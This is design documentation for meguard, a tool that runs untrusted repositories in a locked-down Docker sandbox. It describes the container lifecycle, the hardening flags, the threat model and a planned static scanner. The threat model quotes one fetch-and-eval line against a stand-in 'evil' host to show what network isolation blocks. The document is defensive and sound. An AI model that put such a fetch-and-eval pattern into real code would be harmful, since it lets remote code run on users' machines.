# meguard documentation

## Overview

meguard executes untrusted repositories inside a locked-down container sandbox.
This document covers the architecture of the `run` path, each hardening flag and
the door it closes, the threat model, and the (documented-only) scan analyzer
architecture.

## Architecture

### Packages

- `main.go` - entry point. Builds a signal-aware context (SIGINT/SIGTERM) and
  hands it to the CLI so Ctrl-C cancels in-flight work.
- `cmd/` - cobra wiring. `run` resolves the repo source, builds a Profile, prints
  the pre-run notice, drives the lifecycle, and prints the result. This package
  never imports analyze.
- `internal/sandbox/` - the sandbox engine: the `Runner` interface, the
  `DockerRunner` CLI implementation, the `Profile` type, the pure `createArgs`
  builder, and the `Execute` orchestrator. This package never imports analyze.

### The Runner interface

`Runner` (in `internal/sandbox/runner.go`) abstracts the container lifecycle:

    Create(ctx, Profile) (id, error)
    CopyInto(ctx, id, srcDir, destPath) error
    Start(ctx, id) error
    Exec(ctx, id, cmd, stdout, stderr) (exitCode, error)
    Remove(ctx, id) error

The only implementation is `DockerRunner`, which shells out to the `docker` CLI
via `os/exec`. Defining the interface now keeps the door open for stronger
backends without touching callers.

The container daemon is a TRUST BOUNDARY: it runs privileged, and meguard trusts
it to enforce the isolation configured at create time. meguard does not trust the
repo code that runs inside.

Upgrade paths, in preference order for a security tool:

1. Docker Go SDK - if parsing CLI output becomes fragile, swap the exec calls
   for the SDK behind the same `Runner` interface.
2. Podman rootless - removes the root-daemon trust boundary.
3. gVisor (runsc) - a user-space kernel, stronger syscall isolation.
4. Firecracker microVMs - the strongest kernel boundary.

### The Profile: zero value is safe

`Profile` (in `internal/sandbox/profile.go`) carries only NON-security choices:
the ecosystem image, the install command, and resource ceilings (memory, CPUs,
PID limit). Every security control is hardcoded in `createArgs` and is not a
field, so:

- The zero-value Profile is the safest Profile.
- A forgotten or zero field cannot open a hole; it can only fall back to a
  locked-down default via `Normalize`.
- Configuration only ever RELAXES ceilings or selects an ecosystem; it can never
  weaken isolation.

`Normalize` fills empty fields with conservative defaults (node:20-slim,
`npm install`, 2g, 2 CPUs, 512 PIDs) and never removes a control.

### The lifecycle

`Execute` (in `internal/sandbox/execute.go`) runs:

    create <hardened args> <image> sleep infinity
    docker start <id>
    docker exec -i <id> tar -xf - -C /repo   (repo streamed into the tmpfs)
    docker exec <id> <install cmd>           (stdout/stderr streamed live)
    docker rm -f <id>                        (always)

Copy mechanism: meguard does NOT use `docker cp`. Docker refuses `docker cp` into
a --read-only container, so meguard builds a deterministic tar stream in-process
(internal/sandbox/copy.go, `writeRepoTar`) and pipes it to a `tar` process
running inside the container via `docker exec -i`. That extractor writes to the
/repo tmpfs as the sandbox user and is not subject to the read-only rootfs guard.
The repo therefore lives in a container tmpfs with no host bind mount, exactly as
invariant 2 requires. The container is STARTED before the copy because the copy
runs inside it. The image must provide `tar` (standard in Debian and Alpine
bases). The /repo tmpfs is mounted `mode=1777` so the non-root user can write it.

Cleanup guarantee: immediately after a successful create, `Execute` defers a
`Remove` that uses a DETACHED context with its own timeout. Deferred functions
run after any return and during panic unwinding, and the detached context is not
cancelled when the caller's ctx is (Ctrl-C). So `docker rm -f` runs on success,
on install failure, on panic, and on Ctrl-C.

Before any of this, `run` performs a preflight: `DockerRunner.Preflight` runs
`docker info` to confirm a Docker-compatible runtime is reachable. If it is not,
`run` fails fast, before cloning or printing the pre-run notice, with an
actionable error that names OrbStack, Colima, and Podman and states Docker
Desktop is not required. This turns a raw daemon connection error into guidance
and avoids showing protections for a run that cannot start.

The repo source is resolved in `cmd/run.go`:
- A git URL is `git clone --depth 1`ed to a temp dir that is always removed.
  Cloning does not run install hooks, so it is safe on the host.
- A local path is used in place (its contents are copied into the container, not
  bind mounted).

## Hardening flags and the door each closes

From `internal/sandbox/args.go`, all unconditional:

| Flag | Door it closes |
| --- | --- |
| `--user 1000:1000` | Never run as root inside the container. |
| `--cap-drop ALL` | Drop every Linux capability. |
| `--security-opt no-new-privileges` | Block setuid/privilege escalation. |
| `--read-only` | Root filesystem is immutable. |
| `--tmpfs /repo:exec,mode=1777` | Repo lives in ephemeral RAM; execution allowed; writable by the non-root user. |
| `--tmpfs /home/sandbox` | Scratch HOME in RAM; holds no host secrets. |
| `--tmpfs /tmp` | Writable scratch in RAM only. |
| `--pids-limit 512` | Cap fork bombs. |
| `--memory 2g` | Cap memory (conservative; will be configurable). |
| `--cpus 2` | Cap CPU (conservative; will be configurable). |
| `--network none` | No egress at all; kills stage-2 payload fetches. |
| `-w /repo` | Work in the copied repo. |
| `-e HOME=/home/sandbox` | HOME points at scratch tmpfs, not host home. |

## Threat model

Adversary: a repository that looks like a normal take-home or interview project
but contains a payload intended to steal host secrets (SSH keys, cloud creds,
crypto wallets, browser data) or install a RAT. Typical delivery is an npm
`postinstall` hook or an obfuscated blob evaluated at install time.

What meguard denies:

- Host code execution: repo code only runs inside the container, never on the
  host. meguard only clones/copies on the host.
- Host filesystem access: no bind mounts of the repo or `$HOME`; the repo is
  copied into a container tmpfs. There are no host secrets in the container to
  read.
- Egress: `--network none` means a stage-2 fetch (for example
  `axios.get('https://evil/stage2').then(r => eval(r.data))`) cannot connect,
  and any stolen data cannot be exfiltrated.
- Persistence and escalation: read-only root, tmpfs-only writes, dropped caps,
  no-new-privileges, non-root user, and force-removal on exit leave nothing
  behind and nothing to escalate through.

Out of current scope: kernel escapes from the container runtime (mitigated by
the documented gVisor/Firecracker upgrade paths), and inspecting or reporting
blocked egress attempts (a proxy-based feature is a TODO). The `run` guarantee is
independent of scan; scan is a separate, future, static-analysis feature.

## scan analyzer architecture (documented only; not implemented)

scan will statically analyze a repo before it is ever run. Recorded here so the
future implementation inherits the decisions.

- One `Analyzer` interface; scan is composed of analyzers behind it.
- Pure-Go analyzers (build with CGO_ENABLED=0):
  - manifest: parse package.json, setup.py, pyproject.toml, and similar.
  - entropy: flag base64/hex blobs and minified single-liners.
  - regex: cheap first-pass pattern matching.
- AST analyzer (tree-sitter) is the ONLY analyzer that needs cgo. It is isolated
  behind build tags so it is the sole cgo dependency and degrades to a labeled
  no-op when compiled out. Illustrative seam (not implemented):

      //go:build cgo      -> newASTAnalyzer() returns treeSitterAnalyzer
      //go:build !cgo     -> newASTAnalyzer() returns noopAnalyzer{reason:"AST needs a cgo build"}

- Two build variants ship, same binary name and commands: pure static (no AST)
  and cgo (full).
- Graceful degradation: on the pure build, scan still runs manifest+entropy+regex
  and the AST no-op MUST announce that it is disabled. A clean scan on the pure
  build is NEVER presented as "AST found nothing"; the absence of AST is stated,
  not silent.

### Structural purity

`run` and `sandbox` NEVER import `analyze` or any analyzer package. This is
enforced by `TestSandboxDoesNotImportAnalyze` (in
`internal/sandbox/import_guard_test.go`), which parses `go list -deps` output and
fails if any forbidden import path appears in the sandbox package's transitive
dependencies. The failure direction: the test passes today and fails the moment
sandbox gains such a dependency.

## Upgrade paths summary

- CLI shelling -> Docker Go SDK (same `Runner` interface).
- Docker daemon -> Podman rootless -> gVisor -> Firecracker (increasing
  isolation strength; decreasing trust in a privileged daemon).
